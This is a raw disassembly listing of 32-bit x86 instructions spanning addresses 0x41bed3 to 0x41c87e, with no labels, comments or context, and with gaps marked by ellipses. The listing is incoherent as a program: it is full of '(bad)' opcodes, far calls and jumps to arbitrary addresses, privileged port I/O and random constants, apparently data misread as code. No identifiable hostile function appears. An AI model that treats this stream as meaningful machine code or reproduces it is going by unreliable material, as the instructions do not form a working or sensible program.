  41bed3:	add    esp,DWORD PTR [edi-0x29]
  41bed6:	inc    ebp
  41bed7:	pop    ecx
  41bed8:	dec    BYTE PTR [eax+0x74dd05de]
  41bede:	(bad)  [esi+0x45be8952]
  41bee4:	mul    DWORD PTR [eax]
  41bee6:	scas   al,BYTE PTR es:[edi]
  41bee7:	dec    ebx
  41bee8:	sbb    esp,DWORD PTR [edx+0x61d79e7b]
  41beee:	ficomp WORD PTR [ecx-0xa]
  41bef1:	add    eax,0xbb884430
  41bef6:	dec    ebp
  41bef7:	aas    
  41bef8:	xchg   esi,eax
  41bef9:	push   esi
  41befa:	clc    
  41befb:	xchg   BYTE PTR [ebx-0x3266e6d],al
  41bf01:	ins    DWORD PTR es:[edi],dx
  41bf02:	outs   dx,BYTE PTR ds:[esi]
  41bf03:	and    eax,0x4eba7b3d
  41bf08:	add    edi,DWORD PTR [ecx+0x16]
  41bf0b:	sub    eax,0xab60e9f3
  41bf10:	sub    DWORD PTR [bp+si],0x17e4393f
  41bf17:	cmc    
  41bf18:	into   
  41bf19:	jae    0x41bf90
  41bf1b:	imul   esi,edx,0xffffffea
  41bf1e:	add    al,0xa0
  41bf20:	shl    DWORD PTR cs:[edx],0x19
  41bf24:	push   ecx
  41bf25:	cld    
  41bf26:	fnsave [ecx-0x69e4256b]
  41bf2c:	or     ah,BYTE PTR [ebx]
  41bf2e:	inc    ebp
  41bf2f:	pop    esi
  41bf30:	jle    0x41bf5f
  41bf32:	arpl   WORD PTR [ecx],di
  41bf34:	push   es
  41bf35:	mov    al,0x56
  41bf37:	or     BYTE PTR [esi-0x44a72bd2],al
  41bf3d:	jns    0x41bf49
  41bf3f:	or     DWORD PTR [edx],edx
  41bf41:	push   0x80db3b70
  41bf46:	aam    0xb4
  41bf48:	mov    BYTE PTR [eax-0x471b6cb1],bh
  41bf4e:	aad    0x87
  41bf50:	jnp    0x41bf84
  41bf52:	lahf   
  41bf53:	xor    al,0x29
  41bf55:	cwde   
  41bf56:	and    eax,0x5d37821e
  41bf5b:	cmp    eax,0x27e9a161
  41bf60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf61:	mov    eax,0xdc09913a
  41bf66:	push   edx
  41bf67:	cmp    BYTE PTR [edi+edi*1-0x3f7a40c3],0xdc
  41bf6f:	xchg   edi,eax
  41bf70:	das    
  41bf71:	sub    al,0x7f
  41bf73:	in     al,0xdf
  41bf75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf76:	pop    eax
  41bf77:	xlat   BYTE PTR ds:[ebx]
  41bf78:	cmp    bl,ah
  41bf7a:	(bad)  
  41bf7b:	pushf  
  41bf7c:	repz mov edi,0x97cdca3
  41bf82:	xchg   ebx,eax
  41bf83:	jae    0x41bff8
  41bf85:	jl     0xea44cbe4
  41bf8b:	and    DWORD PTR [eax],ebp
  41bf8d:	push   ebx
  41bf8e:	dec    ebp
  41bf8f:	xchg   esi,eax
	...
  41bff4:	fs jae 0x41c02a
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	xor    ebp,eax
  41c002:	push   esp
  41c003:	dec    ebx
  41c004:	xor    al,0x29
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    al,0x1
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	fnstenv [edx]
  41c00e:	cld    
  41c00f:	fldcw  WORD PTR [esi-0x1]
  41c012:	dec    ebx
  41c013:	push   edx
  41c014:	popf   
  41c015:	add    esp,DWORD PTR [ecx+0x2bf5876c]
  41c01b:	push   esp
  41c01c:	push   eax
  41c01d:	fwait
  41c01e:	retf   0x86e5
  41c021:	xor    esp,ebx
  41c023:	sub    al,0x5c
  41c025:	push   ecx
  41c026:	push   cs
  41c027:	fadd   DWORD PTR ds:0x899ddaf3
  41c02d:	pop    ebp
  41c02e:	jo     0x41bfe0
  41c030:	or     esp,0xffffff89
  41c033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c034:	icebp  
  41c035:	inc    edx
  41c036:	push   0xfffffff8
  41c038:	int    0xd1
  41c03a:	xchg   edi,eax
  41c03b:	fld    TBYTE PTR [esi+0x0]
  41c03e:	sahf   
  41c03f:	add    eax,0x8e03cad6
  41c044:	cmc    
  41c045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c046:	and    eax,0xb74ad2f7
  41c04b:	jge    0x41c045
  41c04d:	in     eax,dx
  41c04e:	je     0x41c017
  41c050:	pop    ss
  41c051:	and    DWORD PTR [edi-0x383915c9],ecx
  41c057:	or     BYTE PTR [edx],ah
  41c059:	call   0x4d13:0xd51c05f7
  41c060:	les    edx,FWORD PTR [eax+edx*1-0x7fa90d72]
  41c067:	je     0x41c007
  41c069:	dec    edx
  41c06a:	imul   esp,DWORD PTR [ebp+0x55],0x1b3eaf9f
  41c071:	jne    0x41c085
  41c073:	sahf   
  41c074:	mov    edi,0xf3f61920
  41c07a:	pop    ebx
  41c07b:	sub    BYTE PTR [eax+edx*4-0xed95e5d],cl
  41c082:	in     al,dx
  41c083:	push   ds
  41c084:	out    0x25,eax
  41c086:	cmp    dh,ch
  41c088:	xchg   DWORD PTR [esi-0x1fc31415],ebx
  41c08e:	test   eax,0xd9a8bad2
  41c093:	push   esi
  41c094:	ins    DWORD PTR es:[edi],dx
  41c095:	lods   eax,DWORD PTR ds:[esi]
  41c096:	popa   
  41c097:	xchg   ecx,eax
  41c098:	popf   
  41c099:	mov    cl,0x3e
  41c09b:	mov    WORD PTR gs:[ebx+0x47164460],cs
  41c0a2:	sbb    BYTE PTR [esi],dl
  41c0a4:	scas   al,BYTE PTR es:[edi]
  41c0a5:	pop    ebp
  41c0a6:	ret    
  41c0a7:	fnstsw WORD PTR [edx+edx*4]
  41c0aa:	add    esi,DWORD PTR [eax]
  41c0ac:	mov    WORD PTR [ebp+esi*1-0xe],fs
  41c0b0:	lods   al,BYTE PTR ds:[esi]
  41c0b1:	fdivr  QWORD PTR [edx+edx*8+0x1140a1b7]
  41c0b8:	push   0xffffffb8
  41c0ba:	shl    BYTE PTR [eax-0x39],1
  41c0bd:	stos   DWORD PTR es:[edi],eax
  41c0be:	push   es
  41c0bf:	ffreep st(1)
  41c0c1:	lock mov ebx,0x9c18508
  41c0c7:	lods   al,BYTE PTR ds:[esi]
  41c0c8:	sub    eax,0xa6f4e056
  41c0cd:	sti    
  41c0ce:	fimul  DWORD PTR [ecx-0x64]
  41c0d1:	out    0x7c,eax
  41c0d3:	sub    DWORD PTR [ebx-0x263056cc],esi
  41c0d9:	pushfw 
  41c0db:	ins    BYTE PTR es:[edi],dx
  41c0dc:	xchg   esp,eax
  41c0dd:	es dec ecx
  41c0df:	icebp  
  41c0e0:	jecxz  0x41c0f7
  41c0e2:	inc    ebx
  41c0e3:	sub    BYTE PTR [edx],dl
  41c0e5:	scas   al,BYTE PTR es:[edi]
  41c0e6:	and    DWORD PTR [ebp-0xc08efb7],0x4ff7dbd
  41c0f0:	mov    edx,edx
  41c0f2:	or     ecx,esp
  41c0f4:	xchg   ebp,eax
  41c0f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0f6:	popf   
  41c0f7:	xchg   ecx,eax
  41c0f8:	imul   esp,DWORD PTR [eax+0x64],0xffffffec
  41c0fc:	test   eax,0xfcbf6e3f
  41c101:	into   
  41c102:	push   ss
  41c103:	lods   eax,DWORD PTR ds:[esi]
  41c104:	dec    eax
  41c105:	retf   0xc7b1
  41c108:	(bad)  
  41c109:	fld    DWORD PTR [esi]
  41c10b:	mov    ds:0x3319220f,eax
	...
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0x9b8ca6e9,eax
  41c183:	mov    ecx,0x12a38
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	mov    cl,0xe4
  41c18e:	cmp    ebx,eax
  41c190:	pusha  
  41c191:	popf   
  41c192:	es dec eax
  41c194:	scas   eax,DWORD PTR es:[edi]
  41c195:	(bad)  
  41c197:	inc    esi
  41c198:	out    dx,al
  41c199:	mov    esi,0x3f4c5e2
  41c19e:	fs je  0x41c1a0
  41c1a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1a2:	xor    BYTE PTR [ebp-0x50beaf5],dh
  41c1a8:	xchg   edi,eax
  41c1a9:	jnp    0x41c136
  41c1ab:	lea    ecx,[ebx]
  41c1ad:	pop    ebp
  41c1ae:	mov    ecx,?
  41c1b0:	cmp    eax,0x24b957f2
  41c1b5:	mov    esp,0x3ff9d10d
  41c1ba:	lahf   
  41c1bb:	cmp    eax,0xd015ef86
  41c1c0:	call   0x4767:0x6830b697
  41c1c7:	cmp    al,0xd9
  41c1c9:	dec    esp
  41c1ca:	pop    ebp
  41c1cb:	je     0x41c1ca
  41c1cd:	clc    
  41c1ce:	push   ds
  41c1cf:	xchg   ebx,eax
  41c1d0:	add    eax,0x1a14bf64
  41c1d5:	sbb    eax,0xde871f59
  41c1da:	mov    ebx,0x7501f44e
  41c1df:	push   esp
  41c1e0:	vpmullw xmm5,xmm4,XMMWORD PTR [ebp+0x41fcdd17]
  41c1e8:	xchg   ecx,eax
  41c1e9:	fwait
  41c1ea:	jmp    0x32962911
  41c1ef:	fnstsw ax
  41c1f1:	clc    
  41c1f2:	in     al,dx
  41c1f3:	inc    ecx
  41c1f4:	fsub   DWORD PTR [edx+eiz*2-0xd]
  41c1f8:	pop    edx
  41c1f9:	dec    eax
  41c1fa:	les    eax,FWORD PTR [ebx+0x7e]
  41c1fd:	mov    eax,ds:0x3b1919af
  41c202:	pop    edi
  41c203:	popa   
  41c204:	icebp  
  41c205:	clc    
  41c206:	ins    BYTE PTR es:[edi],dx
  41c207:	push   0x300d9425
  41c20c:	jo     0x41c1b3
  41c20e:	mov    ebp,0x6a5623ff
  41c213:	ja     0x41c27c
  41c215:	jg     0x41c1b7
  41c217:	or     BYTE PTR [edx+edi*1+0x7e],dh
  41c21b:	aad    0xc4
  41c21d:	mov    al,ds:0x9a853bad
  41c222:	sti    
  41c223:	sbb    bl,0xb4
  41c226:	test   DWORD PTR [edx+0x23],0x8a6be1ec
  41c22d:	sbb    bh,BYTE PTR [edi+0x45]
  41c230:	ficom  WORD PTR [esi]
  41c232:	adc    dh,BYTE PTR [esi+esi*2+0x6b02bff1]
  41c239:	dec    ebp
  41c23a:	imul   esp,DWORD PTR [ebx],0xb721a2b
  41c240:	fwait
  41c241:	pusha  
  41c242:	cmp    esp,DWORD PTR [edi+0x5]
  41c245:	sbb    al,0xbe
  41c247:	mov    ah,0x90
  41c249:	add    bl,0xe2
  41c24c:	fstp   TBYTE PTR [ecx+0x43]
  41c24f:	out    dx,al
  41c250:	pop    eax
  41c251:	in     al,0x4
  41c253:	sbb    cl,BYTE PTR [edi-0x6ae57061]
  41c259:	fwait
  41c25a:	jg     0x41c1f1
  41c25c:	clc    
  41c25d:	cmp    eax,0x944dd643
  41c262:	fild   WORD PTR [edx+0x1264adbe]
  41c268:	sbb    eax,0xb484431c
  41c26d:	cmp    eax,0x7ddf9841
  41c272:	or     ebx,DWORD PTR [ebp-0xa0aa105]
  41c278:	sub    edx,esi
  41c27a:	inc    edi
  41c27b:	cli    
  41c27c:	(bad)  
  41c27d:	jnp    0x41c20b
  41c27f:	fwait
  41c280:	mov    bh,0x93
  41c282:	sub    BYTE PTR [ebx+0x70],dl
  41c285:	(bad)  
  41c286:	gs xchg esp,eax
  41c288:	mov    al,0xd3
  41c28a:	pop    ss
  41c28b:	outs   dx,DWORD PTR ds:[esi]
  41c28c:	sub    ah,bh
  41c28e:	push   eax
  41c28f:	xor    BYTE PTR [eax],al
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	jnp    0x41c2b0
  41c302:	stos   DWORD PTR es:[edi],eax
  41c303:	(bad)  
  41c304:	cmp    al,0x2b
  41c306:	add    DWORD PTR [eax],eax
  41c308:	add    al,0x1
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	scas   al,BYTE PTR es:[edi]
  41c30d:	xor    al,0xdd
  41c30f:	sub    ch,dl
  41c311:	add    eax,esp
  41c313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c314:	lods   al,BYTE PTR ds:[esi]
  41c316:	adc    BYTE PTR [eax+0x2e],0xc8
  41c31a:	dec    edx
  41c31b:	xchg   DWORD PTR ds:0xfd46bdb9,ecx
  41c321:	adc    al,0x7c
  41c323:	in     al,dx
  41c324:	push   esp
  41c325:	fld    DWORD PTR [esi-0x18]
  41c328:	not    BYTE PTR [esp+eax*2+0x5b3639ea]
  41c32f:	mov    dl,0xc6
  41c331:	add    eax,0x74140050
  41c336:	fnsave [ebx+0x40]
  41c339:	enter  0xb43e,0xaa
  41c33d:	xor    edi,DWORD PTR [ebx]
  41c33f:	les    ecx,FWORD PTR [esi]
  41c341:	cmp    eax,0x42180a24
  41c346:	les    ebp,FWORD PTR [edi+0x57]
  41c349:	jecxz  0x41c2de
  41c34b:	out    dx,eax
  41c34c:	ret    
  41c34d:	cs (bad) 
  41c350:	pop    ss
  41c351:	cs dec ebx
  41c353:	inc    ebx
  41c354:	pop    edi
  41c355:	and    eax,DWORD PTR [edi+0x2d]
  41c358:	mov    bh,0xf9
  41c35a:	mov    ch,0x6c
  41c35c:	fstp   DWORD PTR [esi+0x72]
  41c35f:	mov    dl,bl
  41c361:	pop    ds
  41c362:	xchg   ecx,eax
  41c363:	adc    al,0xc7
  41c365:	mov    ss,WORD PTR [ecx-0x3e32e291]
  41c36b:	repnz (bad) 
  41c36d:	aad    0xc5
  41c36f:	sbb    DWORD PTR [esi],edi
  41c371:	push   0x78feced3
  41c376:	loop   0x41c34b
  41c378:	push   edx
  41c379:	(bad)  
  41c37a:	jmp    0x41c38e
  41c37c:	adc    eax,0x8de0a596
  41c381:	mov    dl,0xf5
  41c383:	xor    al,0xcc
  41c385:	push   cs
  41c386:	inc    ebp
  41c387:	xor    DWORD PTR [ebx],eax
  41c389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c38a:	mov    al,ds:0x98e7a6bf
  41c38f:	cmp    BYTE PTR [eax],dl
  41c391:	mov    WORD PTR [esi+0x1585024c],ss
  41c397:	arpl   WORD PTR [edi],cx
  41c399:	or     bl,ah
  41c39b:	xor    ebp,DWORD PTR [ecx+0x203a2f28]
  41c3a1:	popa   
  41c3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3a3:	sbb    ecx,DWORD PTR [eax]
  41c3a5:	cmc    
  41c3a6:	es pushf 
  41c3a8:	int    0x84
  41c3aa:	rcl    ah,1
  41c3ac:	imul   esp,DWORD PTR [edx],0x6e51fe06
  41c3b2:	ffree  st(7)
  41c3b4:	jb     0x41c3ca
  41c3b6:	pushf  
  41c3b7:	stos   DWORD PTR es:[edi],eax
  41c3b8:	imul   esp,DWORD PTR [ebx],0x36
  41c3bb:	jl     0x41c390
  41c3bd:	sbb    dh,BYTE PTR [ecx+ebp*4-0x5a19f8ab]
  41c3c4:	cmp    al,0xb5
  41c3c6:	sub    DWORD PTR [ebp-0x17],0x4f
  41c3ca:	xchg   esi,eax
  41c3cb:	adc    ch,BYTE PTR [esi+0x4b]
  41c3ce:	in     eax,0xa9
  41c3d0:	cmp    DWORD PTR [edi+0xb],0xf97da012
  41c3d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3d8:	push   esi
  41c3d9:	push   edi
  41c3da:	pop    edx
  41c3db:	fcomp  DWORD PTR [ebx]
  41c3dd:	add    cl,BYTE PTR [esi+eiz*2]
  41c3e0:	imul   BYTE PTR [edx+edx*4-0x2a6e2c07]
  41c3e7:	stos   DWORD PTR es:[edi],eax
  41c3e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3e9:	out    0x6c,al
  41c3eb:	ins    DWORD PTR es:[edi],dx
  41c3ec:	inc    ebp
  41c3ed:	and    eax,0xa00d44c9
  41c3f2:	mov    cs,WORD PTR [edi+0x75dbc58d]
  41c3f8:	loopne 0x41c3a8
  41c3fa:	ror    BYTE PTR [edx-0x1035bd71],cl
  41c400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c401:	and    dl,BYTE PTR [edi-0x5f61cb95]
  41c407:	mov    ecx,0x3e35da9e
  41c40c:	jae    0x41c3c8
  41c40e:	and    al,0xce
	...
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	jne    0x41c474
  41c482:	adc    BYTE PTR [eax+eax*2+0x400012c],bh
  41c489:	add    DWORD PTR [eax],eax
  41c48b:	add    BYTE PTR [edx-0x4],ah
  41c48e:	bndldx (bad),[esp+eax*1+0x479eda5]
  41c496:	es das 
  41c498:	jbe    0x41c43a
  41c49a:	addr16 xchg esp,eax
  41c49c:	dec    esi
  41c49d:	ss or  al,0x2a
  41c4a0:	push   es
  41c4a1:	inc    edi
  41c4a2:	xor    BYTE PTR [ebp+0x71],ch
  41c4a5:	(bad)  
  41c4a6:	pushf  
  41c4a7:	call   0x896e7283
  41c4ac:	mov    ecx,DWORD PTR [esi+0x34]
  41c4af:	dec    ecx
  41c4b0:	pop    edx
  41c4b1:	ror    edi,0x4d
  41c4b4:	cmp    ecx,DWORD PTR [ebx+0x7b44b32c]
  41c4ba:	jl     0x41c504
  41c4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4bd:	cwde   
  41c4be:	es pop si
  41c4c1:	xchg   ecx,eax
  41c4c2:	out    dx,eax
  41c4c3:	sub    al,0x1b
  41c4c5:	int3   
  41c4c6:	js     0x41c454
  41c4c8:	mov    dl,0xb5
  41c4cb:	cld    
  41c4cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4cd:	sub    DWORD PTR [ebp+0x1da959e0],edx
  41c4d3:	call   0xc54c660e
  41c4d8:	stos   DWORD PTR es:[edi],eax
  41c4d9:	scas   eax,DWORD PTR es:[edi]
  41c4da:	jl     0x41c53e
  41c4dc:	fistp  WORD PTR [edi+0x70]
  41c4df:	sub    eax,0xd5ed4153
  41c4e4:	sbb    BYTE PTR [esi+edi*4],bh
  41c4e7:	inc    ecx
  41c4e8:	add    BYTE PTR [edi+0x44549e2],cl
  41c4ee:	jmp    0x97969f9c
  41c4f3:	lahf   
  41c4f4:	adc    BYTE PTR [edx+ebp*4],cl
  41c4f7:	and    edx,DWORD PTR [eax+0x2c]
  41c4fa:	and    edi,DWORD PTR [edx+0x68]
  41c4fd:	jl     0x41c485
  41c4ff:	sub    eax,0xa3720d95
  41c504:	jo     0x41c50a
  41c506:	mov    ecx,DWORD PTR [edi-0x70ad661]
  41c50c:	xor    eax,0x48aab312
  41c511:	pusha  
  41c512:	sub    ebx,DWORD PTR [edx-0xe]
  41c515:	int    0x1f
  41c517:	and    eax,0x5f22630f
  41c51c:	lds    esi,FWORD PTR [ebx]
  41c51e:	fidiv  WORD PTR [esp]
  41c521:	test   BYTE PTR [esp+edx*8],ch
  41c524:	push   eax
  41c525:	push   ds
  41c526:	je     0x41c5a3
  41c528:	std    
  41c529:	push   ebp
  41c52a:	inc    ecx
  41c52b:	xor    BYTE PTR [ebp+0x5b],dl
  41c52e:	and    DWORD PTR [ebp-0x37c3de31],ebx
  41c534:	add    edx,DWORD PTR [eax-0x3f8bbe51]
  41c53a:	pop    esp
  41c53b:	data16 mov al,ds:0x760308e
  41c541:	(bad)
  41c544:	call   0xe135d197
  41c549:	outs   dx,DWORD PTR ds:[esi]
  41c54a:	pop    ecx
  41c54b:	fcom   QWORD PTR [eax+0x62]
  41c54e:	xchg   ebp,eax
  41c54f:	(bad)  
  41c550:	jns    0x41c52b
  41c552:	push   esp
  41c553:	sbb    dh,BYTE PTR [eax]
  41c555:	lods   al,BYTE PTR ds:[esi]
  41c556:	xchg   ecx,eax
  41c557:	xor    DWORD PTR [eax+0x1c],edx
  41c55a:	bound  esp,QWORD PTR [ebp+0x792ae9f4]
  41c560:	mov    ebx,0x82a2767f
  41c565:	or     edi,DWORD PTR ss:[edx+0x3c91faec]
  41c56c:	popf   
  41c56d:	pusha  
  41c56e:	ror    DWORD PTR [edx],1
  41c570:	lock push esi
  41c572:	pop    edx
  41c573:	adc    BYTE PTR ds:[esi+ecx*2-0x44ca39df],ah
  41c57b:	or     eax,0xb5a7fb63
  41c580:	nop
  41c581:	ss pop es
  41c583:	pop    esp
  41c584:	dec    esp
  41c585:	mov    bh,BYTE PTR ds:0x3e732b28
  41c58b:	fcom   QWORD PTR [ebx-0x1d]
  41c58e:	lods   al,BYTE PTR ds:[esi]
  41c58f:	pop    ebx
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0x6c9a54e2
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	jo     0x41c5be
  41c60e:	fdivr  st,st(7)
  41c610:	mov    edx,0x5e762fcc
  41c615:	hlt    
  41c616:	dec    esi
  41c617:	and    DWORD PTR [ebp+0x60],ebp
  41c61a:	adc    BYTE PTR [ecx],bl
  41c61c:	hlt    
  41c61d:	pop    ebp
  41c61e:	cmp    al,0xfe
  41c620:	push   esp
  41c621:	adc    BYTE PTR [edi-0x31],bh
  41c624:	push   cs
  41c625:	xor    al,0x77
  41c627:	add    DWORD PTR [esi],esi
  41c629:	out    dx,eax
  41c62a:	or     esp,DWORD PTR [edi+ecx*8]
  41c62d:	repnz fld TBYTE PTR [eax-0x111c6011]
  41c634:	ret    
  41c635:	lock ficomp DWORD PTR [ebp-0x27]
  41c639:	add    eax,0xfa8da5f7
  41c63e:	cdq    
  41c63f:	jnp    0x41c61a
  41c641:	xor    DWORD PTR [bp-0xc],eax
  41c645:	ins    BYTE PTR es:[edi],dx
  41c646:	push   edi
  41c648:	mov    edx,0x2f38ab39
  41c64d:	push   cs
  41c64e:	test   DWORD PTR [esi+0x57],0xea7a3a1b
  41c655:	mov    edx,0x67ca5d62
  41c65a:	xor    eax,0x2d1b4b32
  41c65f:	and    BYTE PTR [esi+esi*4+0x34],al
  41c663:	div    ah
  41c665:	mov    cl,0x9d
  41c667:	fild   WORD PTR [edx-0x4349813d]
  41c66d:	mov    dh,0x8f
  41c66f:	fwait
  41c670:	repz leave 
  41c672:	fadd   QWORD PTR [eax+0x7d]
  41c675:	sub    BYTE PTR [ebx],dl
  41c677:	aas    
  41c678:	in     al,dx
  41c679:	add    ecx,DWORD PTR [eax+edx*2-0x79d8f2b8]
  41c680:	int3   
  41c681:	clc    
  41c682:	ds mov esp,0x35fa974
  41c688:	lods   eax,DWORD PTR ds:[esi]
  41c689:	add    ah,BYTE PTR [ebx+0x56b1a74]
  41c68f:	pop    ecx
  41c690:	data16 add BYTE PTR [ebx],bl
  41c693:	pop    edx
  41c694:	add    BYTE PTR [ecx+0x3350d829],ah
  41c69a:	add    DWORD PTR [esi-0x4e8a564],esp
  41c6a0:	cmp    ebx,ebx
  41c6a2:	and    dh,ah
  41c6a4:	(bad)  
  41c6a5:	fldenv [edx]
  41c6a7:	mov    eax,0xc6a7630b
  41c6ac:	mov    al,bh
  41c6ae:	ds add eax,0xc36d2615
  41c6b4:	ins    DWORD PTR es:[edi],dx
  41c6b5:	outs   dx,DWORD PTR ds:[esi]
  41c6b6:	and    al,0xeb
  41c6b8:	pop    ds
  41c6b9:	ret    
  41c6ba:	frstor ds:0x51d7a431
  41c6c0:	test   edi,ebp
  41c6c2:	add    al,0xd7
  41c6c4:	cdq    
  41c6c5:	jl     0x41c72f
  41c6c7:	clc    
  41c6c8:	add    dl,BYTE PTR [ebx-0x69]
  41c6cb:	call   0x50b7:0x11d9f166
  41c6d2:	stos   BYTE PTR es:[edi],al
  41c6d3:	jno    0x41c714
  41c6d5:	push   ecx
  41c6d6:	popa   
  41c6d7:	ret    0x3724
  41c6da:	pop    ebx
  41c6db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6dc:	pop    edi
  41c6dd:	cmp    ch,cl
  41c6df:	sbb    BYTE PTR [ebx-0x1bce79e],0xa8
  41c6e6:	mov    al,0xe8
  41c6e8:	imul   eax,DWORD PTR [edi-0x7343ae9c],0x14
  41c6ef:	adc    BYTE PTR [ecx+0x34d6bdbf],dh
  41c6f5:	imul   esi,DWORD PTR [ebx],0x100f4331
  41c6fb:	push   eax
  41c6fc:	inc    esp
  41c6fd:	outs   dx,DWORD PTR cs:[esi]
  41c6ff:	jb     0x41c6df
  41c701:	mov    al,0xb
  41c703:	neg    DWORD PTR [ebx+0x548dd4bb]
  41c709:	push   ss
  41c70a:	retf   
  41c70b:	call   0x612594fa
	...
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	mov    cl,bl
  41c782:	push   0xffffff9e
  41c784:	dec    eax
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	loopne 0x41c71f
  41c78e:	jnp    0x41c7d6
  41c790:	mov    ch,0x90
  41c792:	imul   eax,DWORD PTR [esi+0x26],0xffffff9e
  41c796:	add    DWORD PTR [ebp+esi*1+0x6c91f4a2],edi
  41c79d:	jecxz  0x41c7a8
  41c79f:	or     bl,BYTE PTR [eax-0x22]
  41c7a2:	pusha  
  41c7a3:	scas   eax,DWORD PTR es:[edi]
  41c7a4:	mov    bh,0x4
  41c7a6:	mov    ds:0x4bfb7c1d,eax
  41c7ab:	xor    DWORD PTR [esi],edx
  41c7ad:	mov    bh,0x36
  41c7af:	jmp    0x667f:0x93887846
  41c7b6:	enter  0xc8c4,0x3b
  41c7ba:	adc    eax,0x5662feb4
  41c7bf:	jmp    0x17c43076
  41c7c4:	adc    cl,BYTE PTR [esi]
  41c7c6:	dec    edi
  41c7c7:	dec    ecx
  41c7c8:	jb     0x41c80a
  41c7ca:	std    
  41c7cb:	sbb    BYTE PTR [edi-0x4b],dh
  41c7ce:	dec    esp
  41c7cf:	jno    0x41c772
  41c7d1:	stos   BYTE PTR es:[edi],al
  41c7d2:	mov    dh,0x6a
  41c7d4:	xlat   BYTE PTR ds:[ebx]
  41c7d5:	sub    eax,0x38d2d791
  41c7da:	and    BYTE PTR [edi],dl
  41c7dc:	aam    0x7d
  41c7de:	pop    ss
  41c7df:	dec    ebx
  41c7e0:	add    ch,bh
  41c7e2:	jb     0x41c80d
  41c7e4:	mov    ebp,0x4163e6b
  41c7e9:	pop    esp
  41c7ea:	(bad)  
  41c7eb:	(bad)  
  41c7ec:	dec    ebp
  41c7ed:	(bad)  
  41c7ee:	idiv   BYTE PTR [ebx]
  41c7f0:	aas    
  41c7f1:	out    dx,eax
  41c7f2:	enter  0x28c,0xe2
  41c7f6:	test   al,0x1b
  41c7f8:	js     0x41c7ce
  41c7fa:	popf   
  41c7fb:	sub    DWORD PTR [edx],0xdd813806
  41c801:	cmp    BYTE PTR [edi+0x6e],dl
  41c804:	sti    
  41c805:	or     DWORD PTR [ebx+0x40],esp
  41c808:	jmp    0xcbf6dff4
  41c80d:	pushf  
  41c80e:	mov    dh,0xcb
  41c810:	(bad)  
  41c811:	xchg   ebx,eax
  41c812:	cmp    esi,DWORD PTR [esi]
  41c814:	repnz stos DWORD PTR es:[edi],eax
  41c816:	shl    DWORD PTR [eax+0x4c],0xc5
  41c81a:	jmp    0xcde7b313
  41c81f:	movd   mm0,ebp
  41c822:	cmp    ebx,eax
  41c824:	push   es
  41c825:	add    BYTE PTR [edx],al
  41c827:	(bad)  
  41c828:	jecxz  0x41c87b
  41c82a:	xchg   ebx,eax
  41c82b:	mov    ds:0xe737df4,al
  41c830:	and    DWORD PTR [ebx+0x1],eax
  41c833:	and    eax,0x1f045dd3
  41c838:	adc    eax,0x8b99338f
  41c83d:	retf   
  41c83e:	jl     0x41c7d8
  41c840:	cmp    ebp,DWORD PTR [ecx+0x10]
  41c843:	mov    ch,ch
  41c845:	xor    eax,0x66e6802d
  41c84a:	call   0x86f271d0
  41c84f:	mov    ah,0x6c
  41c851:	xor    BYTE PTR [ebp+ebp*8+0x40eec226],bh
  41c858:	fs pop esp
  41c85a:	fcmove st,st(6)
  41c85c:	inc    ecx
  41c85d:	nop
  41c85e:	mov    ah,BYTE PTR [ebx]
  41c860:	push   es
  41c861:	pop    eax
  41c862:	daa    
  41c863:	or     esi,edx
  41c865:	arpl   WORD PTR [ebx+0x2c3d1617],si
  41c86b:	clc    
  41c86c:	jb     0x41c8b6
  41c86e:	out    dx,al
  41c86f:	aaa    
  41c870:	scas   eax,DWORD PTR es:[edi]
  41c871:	jge    0x41c86b
  41c873:	out    0x47,al
  41c875:	mov    ecx,DWORD PTR [edi-0xb]
  41c878:	test   dl,cl
  41c87a:	ret    0xa5b4
  41c87d:	inc    eax
  41c87e:	(bad)  
